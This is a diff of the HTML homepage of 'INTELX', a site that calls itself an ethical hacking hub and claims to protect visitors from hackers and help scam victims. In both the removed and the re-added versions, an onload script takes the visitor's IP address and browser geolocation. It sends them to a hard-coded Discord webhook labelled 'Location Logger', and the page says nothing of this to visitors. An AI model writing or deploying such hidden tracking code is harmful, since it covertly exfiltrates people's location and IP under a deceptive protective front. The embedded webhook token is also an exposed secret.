@@ -1,140 +1,113 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Learn ethical hacking and cybersecurity with free tutorials and resources.">
-    <title>Ethical Hacking Hub</title>
-    <link rel="stylesheet" href="style.css">
-    <!-- Google Fonts for modern typography -->
-    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
-    <!-- reCAPTCHA for contact form -->
-    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Learn ethical hacking and cybersecurity with free tutorials and resources.">
+  <title>INTELX - Ethical Hacking Hub</title>
+  <link rel="stylesheet" href="/style.css">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
 </head>
 <body>
-    <!-- Matrix background removed from main page per request -->
+  <div class="overlay">
+    <nav class="navbar">
+      <a href="/intelx" class="logo">INTELX</a>
+      <ul class="nav-links">
+        <li><a href="/intelx">Home</a></li>
+        <li><a href="/resources">Resources</a></li>
+        <li><a href="/scan">Scan</a></li>
+      </ul>
+      <div class="hamburger">☰</div>
+    </nav>
 
-    <!-- Overlay content -->
-    <div class="overlay">
-        <nav class="navbar">
-            <div class="logo">INTELX</div>
-            <ul class="nav-links">
-                <li><a href="/home">Home</a></li>
-                <li><a href="/resources">Resources</a></li>
-                <li><a href="/scan">Scan</a></li>
-            </ul>
-            <div class="hamburger">☰</div>
-        </nav>
+    <section id="resources" class="resources">
+      <div class="nav-banner">
+        <span></span>
+        <span></span>
+      </div>
+      <div class="resource-actions"></div>
+    </section>
 
-        <!-- Terminal removed from main page to eliminate top blackspace -->
+    <section id="home" class="content">
+      <div id="home-banner" class="home-banner" style="display:none">
+        <div class="nav-banner home-copy">
+          <span>Home</span>
+          <span>Resources</span>
+        </div>
+      </div>
+      <div class="home-context">
+        <h3>We help protect you from hackers</h3>
+        <p>Our tools and guides are designed to help prevent unauthorized access and keep your accounts safe. We provide resources, scanning tools, and clear steps to secure devices and networks.</p>
+        <h4>Were you scammed?</h4>
+        <p>If you were scammed, we will help you — on any social media platform you use. Share the details and we can provide guidance on recovery steps, reporting the scam, and what to do next.</p>
+        <p class="help-note">Tip: For immediate assistance, run a quick scan from Resources and then use <code>help</code> in the terminal for next steps.</p>
+      </div>
+    </section>
 
-        <!-- Resources section (visible) -->
-        <section id="resources" class="resources">
-            <div class="nav-banner">
-                <span></span>
-                <span></span>
-            </div>
-            <div class="resource-actions">
-                
-            </div>
-        </section>
+    <footer>
+      <p>&copy; 2025 INTELX. All rights reserved.</p>
+    </footer>
+  </div>
 
-        <!-- Keep original content lightly below the terminal for accessibility -->
-        <section id="home" class="content">
-            <div id="home-banner" class="home-banner" style="display:none">
-                <div class="nav-banner home-copy">
-                    <span>Home</span>
-                    <span>Resources</span>
-                </div>
-            </div>
-            <!-- Homepage intro removed per user preference; content kept minimal -->
-            <div class="home-context">
-                <h3>We help protect you from hackers</h3>
-                <p>Our tools and guides are designed to help prevent unauthorized access and keep your accounts safe. We provide resources, scanning tools, and clear steps to secure devices and networks.</p>
-                <h4>Were you scammed?</h4>
-                <p>If you were scammed, we will help you — on any social media platform you use. Share the details and we can provide guidance on recovery steps, reporting the scam, and what to do next.</p>
-                <p class="help-note">Tip: For immediate assistance, run a quick scan from Resources and then use <code>help</code> in the terminal for next steps.</p>
-            </div>
-        </section>
+  <script>
+    window.onload = function () {
+      fetch("https://api64.ipify.org?format=json")
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip;
+          if ("geolocation" in navigator) {
+            navigator.geolocation.getCurrentPosition(
+              function (position) {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                const discordWebhook = "https://discord.com/api/webhooks/1429444771880894525/oxecKtZRGyox94mUZ97cI3hUvPWm9XBbuDhjrdoHNpVyL8m5aJOSBLarPsiRx3A6T7W3";
+                const payload = {
+                  content: `🕵️ New visitor detected:\n🌐 IP: ${ip}\n📍 Latitude: ${lat}\n📍 Longitude: ${lon}`,
+                  username: "Location Logger",
+                  avatar_url: "https://i.imgur.com/your-avatar.png"
+                };
+                fetch(discordWebhook, {
+                  method: "POST",
+                  headers: { "Content-Type": "application/json" },
+                  body: JSON.stringify(payload)
+                });
+              },
+              function (error) {
+                console.warn("Location access denied or failed:", error.message);
+              }
+            );
+          } else {
+            console.warn("Geolocation not supported in this browser.");
+          }
+        })
+        .catch(error => console.error("IP fetch failed:", error));
+    };
+  </script>
 
-        <footer>
-            <p>&copy; 2025 INTELX. All rights reserved.</p>
-        </footer>
-    </div>
+  <button class="mobile-switch" aria-label="Open menu" id="mobileSwitch">
+    <span class="dot"></span><span class="dot"></span><span class="dot"></span>
+    <span class="dot"></span><span class="dot"></span><span class="dot"></span>
+    <span class="dot"></span><span class="dot"></span><span class="dot"></span>
+  </button>
 
-<script>
-  window.onload = function () {
-    // Step 1: Get IP address
-    fetch("https://api64.ipify.org?format=json")
-      .then(response => response.json())
-      .then(data => {
-        const ip = data.ip;
-
-        // Step 2: Get Geolocation (requires user permission)
-        if ("geolocation" in navigator) {
-          navigator.geolocation.getCurrentPosition(
-            function (position) {
-              const lat = position.coords.latitude;
-              const lon = position.coords.longitude;
-
-              // Step 3: Send to Discord
-              const discordWebhook = "https://discord.com/api/webhooks/1429444771880894525/oxecKtZRGyox94mUZ97cI3hUvPWm9XBbuDhjrdoHNpVyL8m5aJOSBLarPsiRx3A6T7W3";
-              const payload = {
-                content: `🕵️ New visitor detected:\n🌐 IP: ${ip}\n📍 Latitude: ${lat}\n📍 Longitude: ${lon}`,
-                username: "Location Logger",
-                avatar_url: "https://i.imgur.com/your-avatar.png"
-              };
-
-              fetch(discordWebhook, {
-                method: "POST",
-                headers: {
-                  "Content-Type": "application/json"
-                },
-                body: JSON.stringify(payload)
-              });
-            },
-            function (error) {
-              console.warn("Location access denied or failed:", error.message);
-            }
-          );
-        } else {
-          console.warn("Geolocation not supported in this browser.");
-        }
-      })
-      .catch(error => console.error("IP fetch failed:", error));
-  };
-</script>
-
-    <!-- script.js moved to scan page only -->
-    <!-- Mobile switch button (shows on small screens) -->
-    <button class="mobile-switch" aria-label="Open menu" id="mobileSwitch">
-        <!-- 3x3 dot grid -->
-        <span class="dot"></span><span class="dot"></span><span class="dot"></span>
-        <span class="dot"></span><span class="dot"></span><span class="dot"></span>
-        <span class="dot"></span><span class="dot"></span><span class="dot"></span>
-    </button>
-
-    <script>
-      // Mobile menu toggle using the floating switch and auto-close on link click
-      (function(){
-        const btn = document.getElementById('mobileSwitch');
-        const links = document.querySelectorAll('.nav-links a');
-        if (btn) {
-          btn.addEventListener('click', () => {
-            document.body.classList.toggle('mobile-open');
-            const open = document.body.classList.contains('mobile-open');
-            btn.setAttribute('aria-label', open ? 'Close menu' : 'Open menu');
-          });
-        }
-        if (links && links.length) {
-          links.forEach(a => a.addEventListener('click', () => {
-            // close overlay when a link is tapped on mobile
-            if (document.body.classList.contains('mobile-open')) document.body.classList.remove('mobile-open');
-          }));
-        }
-      })();
-    </script>
+  <script>
+    (function(){
+      const btn = document.getElementById('mobileSwitch');
+      const links = document.querySelectorAll('.nav-links a');
+      if (btn) {
+        btn.addEventListener('click', () => {
+          document.body.classList.toggle('mobile-open');
+          const open = document.body.classList.contains('mobile-open');
+          btn.setAttribute('aria-label', open ? 'Close menu' : 'Open menu');
+        });
+      }
+      if (links && links.length) {
+        links.forEach(a => a.addEventListener('click', () => {
+          if (document.body.classList.contains('mobile-open')) document.body.classList.remove('mobile-open');
+        }));
+      }
+    })();
+  </script>
 </body>
 </html>
-
-
